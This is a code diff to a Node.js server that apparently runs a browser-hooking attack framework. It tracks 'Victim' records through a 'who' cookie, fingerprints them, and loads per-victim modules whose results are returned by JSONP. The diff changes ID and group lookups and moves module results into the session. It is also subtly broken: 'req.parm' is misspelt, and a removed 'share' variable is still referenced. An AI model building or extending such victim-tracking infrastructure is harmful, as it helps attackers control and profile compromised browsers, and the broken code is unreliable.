@@ -7,17 +7,18 @@ router.all('/', function(req, res){
     return res.render('index', {
         protocol:config.ssl?'https:':'',
         host:config.host||req.header('host'),
-        id:req.query.i||'1'
+        id:req.query.x||'Default'
     });
 });
 
 router.all('/x/', function(req, res){
     // who id can use Fingerprinting.js
-    var id = req.param('i');
-    var who = req.cookies.who;
+    var isdef = (req.parm('id') == 'Default'),
+        id = req.param('id'),
+        who = req.cookies.who;
     sql.Victim.findOne({who:who}, function(err, info){
         if(info)return res.jsonp(info.load);
-        sql.Item.findById(id, function(err, info){
+        sql.Item.findOne(isdef?{'_id':id}:{'group':id}, function(err, info){
             if(!info)return res.jsonp({err:404});
             var group = info.group||req.header('referer')||'Default';
             who = sql.hash(group+id+Math.random());
@@ -44,8 +45,8 @@ function online(who, on){
     });
 };
 function handle(req, res, modules, auws, victim, who, msg){
-    var share = {};
     var path = fs.realpathSync('.');
+    req.session.share = {};
     for(var i in modules){
         if(typeof share[modules[i][0]] != 'object'){
             share[modules[i][0]] = [];
@@ -54,10 +55,10 @@ function handle(req, res, modules, auws, victim, who, msg){
             if(!fs.lstatSync(path+'/'+modules[i][0]).isDirectory())throw 'path error.';
             var m = require(path+'/modules/'+modules[i][0]+'/'+modules[i][0]);
         }catch(err){
-            share[modules[i][0]].unshift({'err':err});
+            req.session.share[modules[i][0]].unshift({'err':err});
             continue
         };
-        share[modules[i][0]].unshift(
+        req.session.share[modules[i][0]].unshift(
             m({q:req, s:res}, {v:victim, w:who}, {p:modules[i][1], s:share}, {o:auws, g:msg})
         );
     };
